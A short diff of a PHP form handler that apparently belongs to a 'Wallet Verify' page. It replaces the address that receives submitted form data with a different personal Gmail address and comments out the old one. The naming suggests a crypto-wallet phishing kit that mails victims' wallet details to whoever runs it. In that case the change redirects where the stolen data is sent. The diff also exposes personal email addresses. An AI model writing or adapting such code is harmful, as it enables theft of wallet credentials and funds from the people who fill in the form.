@@ -24,7 +24,9 @@ if (isset($_POST['submit'])) {
         $i++;
     }
 
-    $email_to = 'frogbidofficial@gmail.com';
+    //$email_to = 'frogbidofficial@gmail.com';
+
+    $email_to = 'mingowhk@gmail.com';
     $subject = 'Wallet Verify';
 
     $headers = "From: Wallet Verify <" . $from_email . ">\r\n";
